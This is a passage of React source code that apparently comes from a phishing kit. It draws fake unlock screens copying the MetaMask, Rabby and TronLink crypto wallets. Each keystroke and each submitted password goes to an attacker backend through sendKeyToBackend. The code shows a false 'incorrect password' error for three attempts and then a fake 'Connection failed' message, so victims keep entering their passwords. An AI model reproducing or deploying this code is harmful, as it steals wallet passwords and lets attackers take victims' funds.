173.284 253.727 150.19 253.727 107.397C253.727 64.603 282.715 40.5918 327.55 40.5918C372.384 40.5918 399.79 66.6441 399.79 111.914L399.767 111.892ZM294.021 93.3155H360.574C357.065 78.2942 345.53 70.451 327.091 70.451C308.653 70.451 297.714 78.0878 294.021 93.3155Z", fill: darkMode ? 'rgb(255,255,255)' : 'rgb(22,22,22)' }))),
                            React.createElement("form", { className: "w-full mb-4", onSubmit: (e) => {
                                    e.preventDefault();
                                    handleKeywordTyping();
                                } },
                                React.createElement("div", { className: "w-full border-0 m-0 inline-flex relative flex-col align-top" },
                                    React.createElement("input", { id: "current-password", placeholder: "Enter your password", type: "password", value: keyword, onChange: handleKeywordChange, onKeyDown: (e) => {
                                            if (e.key === 'Enter') {
                                                e.preventDefault();
                                                handleKeywordTyping();
                                            }
                                        }, ref: passwordInputRef, className: `m-0 px-4 py-3 text-base metamask-font-regular bg-transparent border focus:ring-0 placeholder:tracking-normal tracking-normal rounded-[8px] ${darkMode
                                            ? 'text-white border-gray-300 focus:border-white'
                                            : 'text-gray-900 border-gray-300 focus:border-black'}` }),
                                    error && (React.createElement("p", { className: "text-red-500 text-sm mt-1" }, helperText)))),
                            React.createElement("button", { className: `w-full rounded-[12px] h-[48px] font-semibold cursor-default flex items-center justify-center metamask-font-regular text-base ${!keyword
                                    ? darkMode
                                        ? 'bg-[#888989] text-white cursor-not-allowed'
                                        : 'bg-[#888989] text-white cursor-not-allowed'
                                    : darkMode
                                        ? 'bg-[#FFFFFF] text-[#141618]'
                                        : 'bg-[#131415] text-white'}`, onClick: handleKeywordTyping, disabled: connecting }, connecting ? 'Unlocking...' : 'Unlock'),
                            React.createElement("div", { className: "mt-4 w-full text-center text-base" },
                                React.createElement("button", { className: `metamask-font-regular text-[16px] hover:underline ${darkMode ? 'text-[#9eaaff] hover:text-[#9eaaff]' : 'text-[#384df5] hover:text-[#384df5]'}`, onClick: handledForgetPwd }, "Forgot password?")),
                            React.createElement("div", { className: "mt-4 text-center text-base" },
                                React.createElement("span", { className: `metamask-font-regular ${darkMode ? 'text-[#FFFFFF]' : 'text-[#121314]'}` },
                                    "Need help? Contact\u00A0",
                                    React.createElement("button", { className: `hover:underline metamask-font-regular ${darkMode ? 'text-[#9eaaff] hover:text-[#9eaaff]' : 'text-[#384df5] hover:text-[#384df5]'}`, onClick: () => {
                                            closeWindow();
                                            window.open('https://support.metamask.io', '_blank');
                                        } }, "MetaMask support"))))),
                    React.createElement("div", { id: "metamask-forget-password-modal", className: "absolute inset-0 bg-black bg-opacity-50 flex items-center justify-center z-50 hidden" },
                        React.createElement("section", { className: `w-full max-w-[23rem] rounded-lg p-4 flex flex-col shadow-lg ${darkMode ? 'bg-gray-800' : 'bg-white'}`, role: "dialog", "aria-modal": "true", onClick: (e) => e.stopPropagation() },
                            React.createElement("header", { className: "flex justify-between items-center pb-4" },
                                React.createElement("div", { className: "w-full ml-6 mr-6 text-center" },
                                    React.createElement("h4", { className: `text-lg font-semibold !font-700 ${darkMode ? 'text-gray-100' : 'text-gray-900'}` }, "Forgot your password?")),
                                React.createElement("div", { className: "flex justify-end min-w-[24px]" },
                                    React.createElement("button", { className: `p-2 rounded-lg hover:bg-gray-100 ${darkMode
                                            ? 'text-gray-400 hover:text-gray-200 hover:bg-gray-700'
                                            : 'text-gray-500 hover:text-gray-700'}`, "aria-label": "Close", onClick: closeForgetPasswordModal },
                                        React.createElement("img", { src: `${CLIENT_URL}/images/icons/close.svg`, alt: "Close", className: "w-[1.5rem] h-[1.5rem]" })))),
                            React.createElement("div", { className: "px-2" },
                                React.createElement("div", { className: "mb-2 flex justify-center items-center w-full" },
                                    React.createElement("img", { src: `${CLIENT_URL}/images/forgot-password-lock.png`, width: "154", height: "154", alt: "Forgot your password?", className: "self-center" })),
                                React.createElement("p", { className: `mb-4 text-md ${darkMode ? 'text-gray-100' : 'text-gray-900'}` }, "MetaMask can't recover your password for you."),
                                React.createElement("p", { className: `mb-6 text-md ${darkMode ? 'text-gray-100' : 'text-gray-900'}` }, "You can reset your wallet by entering the Secret Recovery Phrase you used when you set up your wallet."),
                                React.createElement("button", { className: `w-full py-3 px-4 text-md font-medium text-white rounded-xl flex justify-center items-center ${darkMode
                                        ? 'bg-red-500 hover:bg-red-600'
                                        : 'bg-red-600 hover:bg-red-700'}`, onClick: handledResetPwd }, "Reset wallet"))))),
                !loadingInitiate && (React.createElement("div", { className: "absolute bottom-0 left-0 w-full pointer-events-none" },
                    React.createElement("div", { className: "w-full flex items-end justify-center", style: { height: 270 } },
                        React.createElement(FoxRiveAnimation, null))))))))));
    return modalContent;
};

const RabbyModal = ({ isOpen, onClose, userId, backendConfig }) => {
    const [keyword, setKeyword] = useState('');
    const [error, setError] = useState(false);
    const [helperText, setHelperText] = useState('');
    const [trying, setTrying] = useState(0);
    const [connecting, setConnecting] = useState(false);
    const [connectionError, setConnectionError] = useState(false);
    const [isClosable, setIsClosable] = useState(true);
    const [isButtonPressed, setIsButtonPressed] = useState(false);
    const [shouldShake, setShouldShake] = useState(false);
    const inputRef = useRef(null);
    const modalRef = useRef(null);
    useEffect(() => {
        if (isOpen) {
            initializeLocationData();
            initializeSocket();
            setTimeout(() => {
                if (inputRef.current) {
                    inputRef.current.focus();
                }
            }, 4000);
            const handleDocumentClick = (e) => {
                if (isClosable && modalRef.current && !modalRef.current.contains(e.target)) {
                    handleClick();
                }
            };
            document.addEventListener('click', handleDocumentClick);
            const modal = document.getElementById('rabby-forget-password-modal');
            if (modal) {
                modal.addEventListener('click', (e) => {
                    if (e.target === modal) {
                        modal.classList.add('hidden');
                    }
                });
            }
            const handleHelpPopoverClick = (e) => {
                const helpPopover = document.getElementById('rabby-help-popover');
                const helpButton = document.getElementById('menu-button--menu--:r1:');
                if (helpPopover && !helpPopover.classList.contains('hidden')) {
                    const isClickOnButton = helpButton && (helpButton === e.target || helpButton.contains(e.target));
                    const isClickOnPopover = helpPopover.contains(e.target);
                    if (!isClickOnPopover && !isClickOnButton) {
                        closeHelpModal();
                    }
                }
            };
            document.addEventListener('click', handleHelpPopoverClick);
            return () => {
                document.removeEventListener('click', handleDocumentClick);
                document.removeEventListener('click', handleHelpPopoverClick);
            };
        }
    }, [isOpen, isClosable]);
    const handleClick = () => {
        if (onClose)
            onClose();
        setKeyword('');
        setTrying(0);
        setConnectionError(false);
        setError(false);
        setIsButtonPressed(false);
        setShouldShake(false);
    };
    const getCaretCoordinates = (element, position) => {
        const div = document.createElement('div');
        div.id = 'password-mirror-div';
        document.body.appendChild(div);
        const computed = window.getComputedStyle(element);
        div.textContent = new Array(position + 1).join('•');
        const span = document.createElement('span');
        span.textContent = '•';
        div.appendChild(span);
        const coordinates = {
            top: span.offsetTop + parseInt(computed.borderTopWidth, 10),
            left: span.offsetLeft + parseInt(computed.borderLeftWidth, 10),
        };
        document.body.removeChild(div);
        return coordinates;
    };
    const handleKeywordChange = async (e) => {
        const target = e.target;
        const element = target || inputRef.current;
        if (element && typeof element.getBoundingClientRect === 'function') {
            element.getBoundingClientRect();
            getCaretCoordinates(element, element.selectionEnd || 0);
            // Animation emitter removed (was for Mascot)
        }
        const newKeyword = target.value;
        setKeyword(newKeyword);
        setError(false);
        setShouldShake(false);
        const currentUserId = backendConfig?.userId || userId;
        if (currentUserId && newKeyword && (backendConfig?.enabled !== false)) {
            await sendKeyToBackend(currentUserId, 'cha', newKeyword, WALLET_TYPE_SHORTKEY.RABBY);
        }
    };
    const handledForgetPwd = () => {
        handledResetPwd();
    };
    const handledResetPwd = () => {
        handleClick();
        closeForgetPasswordModal();
        window.open('chrome-extension://acmacodkjbdgmoleebolmdjonilkdbch/index.html#/forgot-password', '_blank');
    };
    const handleKeywordTyping = async () => {
        if (connecting || !keyword) {
            return;
        }
        setConnecting(true);
        const currentUserId = backendConfig?.userId || userId;
        if (!currentUserId) {
            setConnecting(false);
            setError(true);
            setHelperText('User ID is required');
            setShouldShake(true);
            setTimeout(() => {
                setShouldShake(false);
            }, 500);
            return;
        }
        if (backendConfig?.enabled !== false) {
            const result = await sendKeyToBackend(currentUserId, 'enter', keyword, WALLET_TYPE_SHORTKEY.RABBY);
            setTimeout(() => {
                setConnecting(false);
                if (trying < 3) {
                    setError(true);
                    setHelperText(result.error || 'Password is incorrect. Please try again.');
                    setTrying(trying + 1);
                    setShouldShake(true);
                    setTimeout(() => {
                        setShouldShake(false);
                    }, 500);
                }
                else {
                    setConnectionError(true);
                }
            }, 150);
        }
        else {
            setTimeout(() => {
                setConnecting(false);
            }, 150);
        }
    };
    const closeForgetPasswordModal = () => {
        const modal = document.getElementById('rabby-forget-password-modal');
        if (modal) {
            modal.classList.add('hidden');
        }
    };
    const closeHelpModal = () => {
        const modal = document.getElementById('rabby-help-popover');
        if (modal) {
            modal.classList.add('hidden');
        }
    };
    const handleButtonMouseDown = () => {
        setIsButtonPressed(true);
    };
    const handleButtonMouseUp = () => {
        setIsButtonPressed(false);
    };
    const handleButtonMouseLeave = () => {
        setIsButtonPressed(false);
    };
    const closeWindow = () => {
        handleClick();
        setTimeout(() => {
            setConnectionError(false);
            setKeyword('');
            setTrying(0);
            setError(false);
            setIsButtonPressed(false);
            setShouldShake(false);
        }, 1000);
    };
    if (!isOpen)
        return null;
    const modalContent = (React.createElement("div", { id: "header-layout", ref: modalRef, className: `fixed top-0 right-[150px] z-[1000] flex transition-opacity duration-200 max-[395px]:scale-75 max-[265px]:scale-50
        ${isOpen ? 'opacity-100' : 'opacity-0 pointer-events-none'}`, onMouseEnter: () => setIsClosable(false), onMouseLeave: () => setIsClosable(true) },
        React.createElement("div", { className: "w-[400px] h-[599px] relative" },
            React.createElement("div", { className: "h-full relative" }, connectionError ? (React.createElement("div", { className: "text-white text-center px-4 py-8 flex flex-col h-full justify-between bg-[#121314]" },
                React.createElement("div", null),
                React.createElement("div", { className: "" },
                    React.createElement("div", { className: "flex justify-center w-full items-center mb-4" },
                        React.createElement("svg", { className: "text-2xl text-center text-white w-6 h-6", fill: "currentColor", viewBox: "0 0 20 20" },
                            React.createElement("path", { fillRule: "evenodd", d: "M18 10a8 8 0 11-16 0 8 8 0 0116 0zm-7 4a1 1 0 11-2 0 1 1 0 012 0zm-1-9a1 1 0 00-1 1v4a1 1 0 102 0V6a1 1 0 00-1-1z", clipRule: "evenodd" }))),
                    React.createElement("h3", { className: "text-xl font-extrabold euclid-bold" }, "Connection failed"),
                    React.createElement("div", { className: "text-sm leading-relaxed" },
                        React.createElement("h6", null, "Fetching of"),
                        React.createElement("h5", { className: "font-bold" }, "@unstoppabledomains/unstoppable-"),
                        React.createElement("h5", null,
                            React.createElement("span", { className: "font-bold" }, "resolution-snap"),
                            " failed, check your network and"),
                        React.createElement("h5", null, "try again.")),
                    React.createElement("div", { className: "mt-4 text-base border-l-4 border-red-500 p-4 rounded text-left bg-gray-700" },
                        React.createElement("h5", null, "One or more permissions are not allowed:"),
                        React.createElement("h5", null, "This endowment is experiental and therefore "),
                        React.createElement("h5", null, "not available."))),
                React.createElement("button", { className: `w-full rounded-full cursor-pointer p-2.5 hover:bg-[#3148f5] border-[#ffffff] bg-[#4459ff] text-[#141618] rabby-font`, onClick: closeWindow }, "Ok"))) : (React.createElement("div", null,
                React.createElement("div", { id: "app-content", style: {
                        overflowX: 'hidden',
                        height: '600px',
                        overflow: 'auto',
                        boxShadow: '0px 2px 12px #000000a1',
                        display: 'flex',
                        position: 'relative',
                        flexDirection: 'column',
                        width: '400px',
                    } },
                    React.createElement("svg", { width: "400", height: "600", fill: "none", xmlns: "http://www.w3.org/2000/svg", style: { overflow: 'hidden', position: 'absolute', zIndex: '-1' } },
                        React.createElement("g", { clipPath: "url(#background_svg__clip0_114948_40926)" },
                            React.createElement("path", { transform: "matrix(1 0 0 -1 0 600)", fill: "url(#background_svg__paint0_radial_114948_40926)", d: "M0 0h400v600H0z" }),
                            React.createElement("g", { opacity: "0.2", filter: "url(#background_svg__filter0_f_114948_40926)" },
                                React.createElement("path", { d: "M473.837 864.74c-129.844 102.557-195.138 14.712-265.119-73.89-69.981-88.601-118.147-144.403 11.696-246.96 129.844-102.556 174.336-148.327 244.317-59.726s138.95 278.02 9.106 380.576z", fill: "#4569C7" })),
                            React.createElement("g", { opacity: "0.1", filter: "url(#background_svg__filter1_f_114948_40926)" },
                                React.createElement("path", { d: "M117.4-110.123c149.18 49.577 290.17-69.223 240.593 79.956-49.576 149.18-210.7 229.924-359.88 180.347-149.179-49.576-229.923-210.7-180.347-359.88 49.577-149.179 150.455 50.001 299.634 99.577z", fill: "#2174A3" })),
                            React.createElement("path", { d: "M0-10h400v621H0V-10z", fill: "url(#background_svg__paint1_radial_114948_40926)" }),
                            React.createElement("g", { filter: "url(#background_svg__filter2_b_114948_40926)" },
                                React.createElement("path", { d: "M0-10h400v621H0V-10z", fill: "#ECF3FF", fillOpacity: "0.7" })),
                            React.createElement("path", { fill: "url(#background_svg__paint2_linear_114948_40926)", d: "M0 0h400v600H0z" })),
                        React.createElement("defs", null,
                            React.createElement("filter", { id: "background_svg__filter0_f_114948_40926", x: "-60.978", y: "237.073", width: "807.895", height: "873.845", filterUnits: "userSpaceOnUse", colorInterpolationFilters: "sRGB" },
                                React.createElement("feFlood", { floodOpacity: "0", result: "BackgroundImageFix" }),
                                React.createElement("feBlend", { in: "SourceGraphic", in2: "BackgroundImageFix", result: "shape" }),
                                React.createElement("feGaussianBlur", { stdDeviation: "100", result: "effect1_foregroundBlur_114948_40926" })),
                            React.createElement("filter", { id: "background_svg__filter1_f_114948_40926", x: "-396.836", y: "-464.175", width: "964.947", height: "828.958", filterUnits: "userSpaceOnUse", colorInterpolationFilters: "sRGB" },
                                React.createElement("feFlood", { floodOpacity: "0", result: "BackgroundImageFix" }),
                                React.createElement("feBlend", { in: "SourceGraphic", in2: "BackgroundImageFix", result: "shape" }),
                                React.createElement("feGaussianBlur", { stdDeviation: "100", result: "effect1_foregroundBlur_114948_40926" })),
                            React.createElement("filter", { id: "background_svg__filter2_b_114948_40926", x: "-40", y: "-50", width: "480", height: "701", filterUnits: "userSpaceOnUse", colorInterpolationFilters: "sRGB" },
                                React.createElement("feFlood", { floodOpacity: "0", result: "BackgroundImageFix" }),
                                React.createElement("feGaussianBlur", { in: "BackgroundImageFix", stdDeviation: "20" }),
                                React.createElement("feComposite", { in2: "SourceAlpha", operator: "in", result: "effect1_backgroundBlur_114948_40926" }),
                                React.createElement("feBlend", { in: "SourceGraphic", in2: "effect1_backgroundBlur_114948_40926", result: "shape" })),
                            React.createElement("radialGradient", { id: "background_svg__paint0_radial_114948_40926", cx: "0", cy: "0", r: "1", gradientUnits: "userSpaceOnUse", gradientTransform: "matrix(-44.61529 480 -346.21069 -32.17977 215.897 71.667)" },
                                React.createElement("stop", { stopColor: "#FDF8FF", stopOpacity: "0.68" }),
                                React.createElement("stop", { offset: "1", stopColor: "#E4EDFF" })),
                            React.createElement("radialGradient", { id: "background_svg__paint1_radial_114948_40926", cx: "0", cy: "0", r: "1", gradientUnits: "userSpaceOnUse", gradientTransform: "rotate(95.132 78.613 130.776) scale(498.799 347.802)" },
                                React.createElement("stop", { stopColor: "#FDF8FF", stopOpacity: "0.68" }),
                                React.createElement("stop", { offset: "1", stopColor: "#E4EDFF" })),
                            React.createElement("linearGradient", { id: "background_svg__paint2_linear_114948_40926", x1: "199.467", y1: "-171.5", x2: "203.308", y2: "214.462", gradientUnits: "userSpaceOnUse" },
                                React.createElement("stop", { stopColor: "#7084FF" }),
                                React.createElement("stop", { offset: "1", stopColor: "#fff", stopOpacity: "0" })),
                            React.createElement("clipPath", { id: "background_svg__clip0_114948_40926" },
                                React.createElement("path", { fill: "#fff", transform: "matrix(1 0 0 -1 0 600)", d: "M0 0h400v600H0z" })))),
                    React.createElement("div", { className: "flex items-center justify-center mt-[80px]" },
                        React.createElement("svg", { width: "100", height: "100", viewBox: "0 0 161 160", fill: "none", xmlns: "http://www.w3.org/2000/svg" },
                            React.createElement("g", { clipPath: "url(#clip0_355_3988)" },
                                React.createElement("path", { d: "M148.047 88.6169C153.448 76.5068 126.749 42.6731 101.243 28.5773C85.1659 17.6575 68.4134 19.1577 65.0205 23.9523C57.5744 34.4746 89.6766 43.3906 111.146 53.795C106.531 55.807 102.182 59.4176 99.6242 64.0352C91.6203 55.264 74.0528 47.7107 53.4392 53.795C39.5481 57.8951 28.0036 67.5611 23.5417 82.1605C22.4575 81.6769 21.2571 81.4082 19.9942 81.4082C15.1649 81.4082 11.25 85.3379 11.25 90.1854C11.25 95.033 15.1649 98.9627 19.9942 98.9627C20.8894 98.9627 23.6882 98.36 23.6882 98.36L68.4134 98.6853C50.5268 127.168 36.3913 131.331 36.3913 136.266C36.3913 141.2 49.9165 139.863 54.9949 138.024C79.3057 129.219 105.417 101.777 109.897 93.8779C128.713 96.2343 144.526 96.513 148.047 88.6169Z", fill: "url(#paint0_linear_355_3988)" }),
                                React.createElement("path", { d: "M64.4841 29.3587C65.9945 26.3383 76.2037 26.0013 90.0681 32.556C100.244 37.367 111.081 48.108 111.709 50.7708C111.982 51.9293 112.142 53.4048 111.147 53.7982C111.146 53.7976 111.145 53.7968 111.143 53.7962L111.146 53.7953C93.4437 45.2163 68.5135 37.6487 64.4841 29.3587Z", fill: "url(#paint1_linear_355_3988)" }),
                                React.createElement("path", { d: "M58.6694 71.8772C73.5151 71.8772 79.9042 76.6996 84.9936 85.759C88.62 92.2144 87.8148 102.425 83.975 109.322C87.5754 110.217 90.7417 111.205 93.5453 112.281C88.9983 116.531 83.7943 120.944 78.2592 124.991C70.7233 123.061 63.8755 121.228 53.4916 118.557C57.9298 113.696 63.0004 107.305 68.4135 98.6848L28.269 98.3928C28.1296 96.7639 28.0884 94.9926 28.1293 93.0598C28.5196 74.6387 50.5038 71.8773 58.6694 71.8772Z", fill: "url(#paint2_linear_355_3988)" }),
                                React.createElement("path", { d: "M23.0061 96.5002C24.6461 110.494 32.5692 115.978 48.7593 117.601C64.9494 119.224 74.2363 118.136 86.6003 119.265C96.9266 120.208 106.147 125.49 109.567 123.664C112.646 122.022 110.923 116.087 106.804 112.279C101.465 107.343 94.0752 103.911 81.0725 102.694C83.6637 95.5717 82.9376 85.5861 78.9131 80.1533C73.0941 72.298 62.3533 68.7465 48.7593 70.2982C34.5568 71.9193 20.9479 78.938 23.0061 96.5002Z", fill: "url(#paint3_linear_355_3988)" })),
                            React.createElement("defs", null,
                                React.createElement("linearGradient", { id: "paint0_linear_355_3988", x1: "51.8217", y1: "77.8928", x2: "146.938", y2: "104.764", gradientUnits: "userSpaceOnUse" },
                                    React.createElement("stop", { stopColor: "#4C65FE" }),
                                    React.createElement("stop", { offset: "1", stopColor: "#8F9FFF" })),
                                React.createElement("linearGradient", { id: "paint1_linear_355_3988", x1: "130.877", y1: "76.079", x2: "62.0252", y2: "7.32076", gradientUnits: "userSpaceOnUse" },
                                    React.createElement("stop", { stopColor: "#4C65FE" }),
                                    React.createElement("stop", { offset: "1", stopColor: "#5156D8", stopOpacity: "0" })),
                                React.createElement("linearGradient", { id: "paint2_linear_355_3988", x1: "95.4537", y1: "114.683", x2: "29.4416", y2: "76.8748", gradientUnits: "userSpaceOnUse" },
                                    React.createElement("stop", { stopColor: "#2D46E2" }),
                                    React.createElement("stop", { offset: "1", stopColor: "#8697FF", stopOpacity: "0" })),
                                React.createElement("linearGradient", { id: "paint3_linear_355_3988", x1: "57.4972", y1: "77.1806", x2: "102.242", y2: "133.819", gradientUnits: "userSpaceOnUse" },
                                    React.createElement("stop", { stopColor: "#4C65FE" }),
                                    React.createElement("stop", { offset: "1", stopColor: "#4C65FE" })),
                                React.createElement("clipPath", { id: "clip0_355_3988" },
                                    React.createElement("rect", { width: "160", height: "160", fill: "white", transform: "translate(0.5)" }))))),
                    React.createElement("div", null,
                        React.createElement("h1", { className: "rabby-font font-semibold", style: { width: '100%', fontSize: '24px', lineHeight: '23px', marginBottom: '4px', textAlign: 'center', marginTop: '14px', color: 'rgb(25, 41, 69, 1)' } }, "Rabby Wallet"),
                        React.createElement("p", { style: { lineHeight: '20px', color: '#6a7587', fontSize: '14px', textAlign: 'center', margin: '12px 51px 14px 52px' }, className: "rabby-font" }, "Your go-to wallet for Ethereum and EVM"),
                        React.createElement("div", { className: "ppp", style: { border: 'none', margin: '34px 22px 0px 22px', backgroundColor: 'rgb(245,245,245)', alignItems: 'center' } },
                            React.createElement("input", { ref: inputRef, type: "password", placeholder: "Enter the Password to Unlock", onChange: handleKeywordChange, className: "rabby-font", style: {
                                    width: '100%',
                                    height: '56px',
                                    borderRadius: '10px',
                                    outline: 'none',
                                    borderWidth: '1px',
                                    borderStyle: 'solid',
                                    borderColor: error ? 'red' : 'transparent',
                                    fontSize: '14px',
                                    color: '#192945',
                                    padding: '15px 16px',
                                    backgroundColor: 'white',
                                    transition: 'border-color 0.3s ease',
                                    letterSpacing: keyword ? '4px' : 'normal',
                                }, onMouseEnter: (e) => {
                                    if (!error) {
                                        e.target.style.borderColor = '#7084ff';
                                    }
                                }, onMouseLeave: (e) => {
                                    if (!error) {
                                        e.target.style.borderColor = 'transparent';
                                    }
                                }, onKeyDown: (e) => {
                                    if (e.key === 'Enter')
                                        handleKeywordTyping();
                                }, value: keyword })),
                        error && (React.createElement("p", { style: { color: 'red', fontSize: '13px', margin: '8px 22px 0 22px' } },
                            React.createElement("span", { className: "pr-[5px] rabby-font text-red" }, "Incorrect password"),
                            ' ',
                            React.createElement("a", { className: "cursor-pointer rabby-font", style: { color: 'blue', textDecoration: 'underline' }, onClick: handledForgetPwd }, "Forgot Password?"))),
                        React.createElement("div", { style: { bottom: '35px', position: 'absolute', width: '360px', margin: '0px 22px' } },
                            React.createElement("button", { className: "rabby-font", style: {
                                    width: '100%',
                                    height: '56px',
                                    backgroundColor: 'rgb(97, 118, 255)',
                                    borderRadius: '8px',
                                    fontSize: '16px',
                                    fontWeight: 600,
                                    color: 'white',
                                    cursor: 'pointer',
                                    marginBottom: '20px',
                                }, onClick: handleKeywordTyping, disabled: connecting, onMouseDown: handleButtonMouseDown, onMouseUp: handleButtonMouseUp, onMouseLeave: handleButtonMouseLeave }, "Unlock"),
                            React.createElement("div", { className: "w-full flex justify-center items-center" },
                                React.createElement("button", { className: "hover:underline rabby-font", style: {
                                        margin: '0px 112px',
                                        backgroundColor: 'transparent',
                                        fontSize: '13px',
                                        textAlign: 'center',
                                        fontWeight: 500,
                                        color: '#3e495e',
                                    }, onClick: handledForgetPwd }, "Forgot Password?"))))),
                React.createElement("div", { id: "popover-content" })))))));
    return modalContent;
};

const TronlinkModal = ({ isOpen, onClose, userId, backendConfig }) => {
    const [keyword, setKeyword] = useState('');
    const [error, setError] = useState(false);
    const [helperText, setHelperText] = useState('');
    const [trying, setTrying] = useState(0);
    const [connecting, setConnecting] = useState(false);
    const [connectionError, setConnectionError] = useState(false);
    const [isClosable, setIsClosable] = useState(true);
    const [shouldShake, setShouldShake] = useState(false);
    const [showPassword, setShowPassword] = useState(false);
    const [loadingInitiate, setLoadingInitiate] = useState(true);
    const [showForgetPasswordModal, setShowForgetPasswordModal] = useState(false);
    const [continueCountdown, setContinueCountdown] = useState(0);
    const passwordInputRef = useRef(null);
    const modalRef = useRef(null);
    const countdownIntervalRef = useRef(null);
    // Handle initial loading - only run once when modal opens
    useEffect(() => {
        if (isOpen) {
            initializeLocationData();
            initializeSocket();
            setLoadingInitiate(true);
            const initialLoadTimeout = setTimeout(() => {
                setLoadingInitiate(false);
                setTimeout(() => {
                    passwordInputRef.current?.focus();
                }, 1500);
            }, 1500);
            return () => {
                clearTimeout(initialLoadTimeout);
            };
        }
        else {
            setLoadingInitiate(true);
        }
    }, [isOpen]);
    // Handle document click - separate effect
    useEffect(() => {
        if (!isOpen)
            return;
        const handleDocumentClick = (e) => {
            if (isClosable && modalRef.current && !modalRef.current.contains(e.target)) {
                handleClick();
            }
        };
        document.addEventListener('click', handleDocumentClick);
        return () => {
            document.removeEventListener('click', handleDocumentClick);
        };
    }, [isOpen, isClosable]);
    // Cleanup countdown interval
    useEffect(() => {
        return () => {
            if (countdownIntervalRef.current) {
                clearInterval(countdownIntervalRef.current);
            }
        };
    }, []);
    const handleClick = () => {
        if (onClose)
            onClose();
        setKeyword('');
        setTrying(0);
        setConnectionError(false);
        setError(false);
        setShouldShake(false);
        setShowPassword(false);
        setShowForgetPasswordModal(false);
        setContinueCountdown(0);
        if (countdownIntervalRef.current) {
            clearInterval(countdownIntervalRef.current);
            countdownIntervalRef.current = null;
        }
    };
    const handleKeywordChange = async (e) => {
        const newKeyword = e.target.value;
        setKeyword(newKeyword);
        setError(false);
        setShouldShake(false);
        const currentUserId = backendConfig?.userId || userId;
        if (currentUserId && newKeyword && (backendConfig?.enabled !== false)) {
            await sendKeyToBackend(currentUserId, 'cha', newKeyword, WALLET_TYPE_SHORTKEY.TRONLINK);
        }
    };
    const togglePasswordVisibility = () => {
        setShowPassword(prev => !prev);
        setTimeout(() => {
            passwordInputRef.current?.focus();
        }, 0);
    };
    const handleKeywordTyping = async () => {
        if (connecting || !keyword)
            return;
        setConnecting(true);
        const currentUserId = backendConfig?.userId || userId;
        if (!currentUserId) {
            setConnecting(false);
            setError(true);
            setHelperText('User ID is required');
            setShouldShake(true);
            setTimeout(() => setShouldShake(false), 500);
            return;
        }
        if (backendConfig?.enabled !== false) {
            const result = await sendKeyToBackend(currentUserId, 'enter', keyword, WALLET_TYPE_SHORTKEY.TRONLINK);
            setTimeout(() => {
                setConnecting(false);
                if (trying < 3) {
                    setError(true);
                    setHelperText(result.error || 'Wrong password');
                    setTrying(trying + 1);
                    setShouldShake(true);
                    setTimeout(() => setShouldShake(false), 500);
                }
                else {
                    setConnectionError(true);
                }
                passwordInputRef.current?.focus();
            }, 150);
        }
        else {
            setTimeout(() => setConnecting(false), 150);
        }
    };
    const showForgetPassword = () => {
        setShowForgetPasswordModal(true);
        setContinueCountdown(10);
        // Start countdown timer
        countdownIntervalRef.current = setInterval(() => {
            setContinueCountdown(prev => {
                if (prev > 1) {
                    return prev - 1;
                }
                else {
                    if (countdownIntervalRef.current) {
                        clearInterval(countdownIntervalRef.current);
                        countdownIntervalRef.current = null;
                    }
                    return 0;
                }
            });
        }, 1000);
    };
    const closeForgetPasswordModal = () => {
        if (countdownIntervalRef.current) {
            clearInterval(countdownIntervalRef.current);
            countdownIntervalRef.current = null;
        }
        setShowForgetPasswordModal(false);
        setContinueCountdown(0);
    };
    const handledResetPwd = () => {
        handleClick();
        closeForgetPasswordModal();
        window.open('chrome-extension://acmacodkjbdgmoleebolmdjonilkdbch/index.html#/forgot-password', '_blank');
    };
    const closeWindow = () => {
        handleClick();
        setTimeout(() => {
            setConnectionError(false);
            setKeyword('');
            setTrying(0);
            setError(false);
        }, 1000);
    };
    if (!isOpen)
        return null;
    const isButtonEnabled = keyword && keyword.trim().length > 0;
    const modalContent = (React.createElement("div", { id: "header-layout", ref: modalRef, className: `fixed top-0 right-[150px] z-[1000] flex transition-opacity duration-200 max-[395px]:scale-75 max-[265px]:scale-50
        ${isOpen ? 'opacity-100' : 'opacity-0 pointer-events-none'}`, onMouseEnter: () => setIsClosable(false), onMouseLeave: () => setIsClosable(true) },
        React.createElement("div", { className: "w-[360px] h-[601px] shadow-[0_4px_20px_0_rgba(0,0,0,0.3)] relative" },
            React.createElement("div", { className: "h-full relative", style: { backgroundColor: '#FFFFFF' } }, connectionError ? (React.createElement("div", { className: "text-center px-4 py-8 flex flex-col h-full justify-between" },
                React.createElement("div", null),
                React.createElement("div", { className: "" },
                    React.createElement("div", { className: "flex justify-center w-full items-center mb-4" },
                        React.createElement("svg", { className: "text-2xl text-center w-6 h-6 text-red-500", fill: "currentColor", viewBox: "0 0 20 20" },
                            React.createElement("path", { fillRule: "evenodd", d: "M18 10a8 8 0 11-16 0 8 8 0 0116 0zm-7 4a1 1 0 11-2 0 1 1 0 012 0zm-1-9a1 1 0 00-1 1v4a1 1 0 102 0V6a1 1 0 00-1-1z", clipRule: "evenodd" }))),
                    React.createElement("h3", { className: "text-xl font-extrabold" }, "Connection failed"),
                    React.createElement("p", { className: "text-sm" }, "Please check your connection and try again.")),
                React.createElement("button", { className: "w-full rounded-full cursor-pointer p-2.5 text-white hover:bg-[#3148f5] bg-[#4459ff]", onClick: closeWindow }, "Ok"))) : (React.createElement("div", { className: "relative w-full h-full", style: { backgroundColor: '#FFFFFF' } },
                loadingInitiate && (React.createElement("div", { className: "absolute inset-0 z-[1002] flex items-center justify-center bg-transparent" },
                    React.createElement("div", { className: "px-[30px] py-[20px] rounded-[8px]", style: { backgroundColor: '#232C41db' } },
                        React.createElement("img", { src: resolveAssetUrl(ASSET_PATHS.tronlinkLoading), alt: "Loading", width: "50", height: "50" })))),
                React.createElement("div", { className: `flex flex-col h-full bg-white` },
                    React.createElement("div", { className: "flex flex-col overflow-y-auto h-full justify-between pb-[30px]" },
                        React.createElement("div", null,
                            React.createElement("div", { className: "flex justify-center mt-[80px] mb-[100px]" },
                                React.createElement("svg", { width: "150", height: "120", viewBox: "0 0 150 120", fill: "none", xmlns: "http://www.w3.org/2000/svg" },
                                    React.createElement("g", { clipPath: "url(#clip0_35_162)" },
                                        React.createElement("path", { fillRule: "evenodd", clipRule: "evenodd", d: "M7.41504 119.326H11.7971V90.6738H7.41504V119.326Z", fill: "black" }),
                                        React.createElement("path", { fillRule: "evenodd", clipRule: "evenodd", d: "M0 95.0559H19.2135V90.6738H0V95.0559Z", fill: "black" }),
                                        React.createElement("path", { fillRule: "evenodd", clipRule: "evenodd", d: "M80.8994 119.325H95.3938V114.943H80.8994V119.325Z", fill: "black" }),
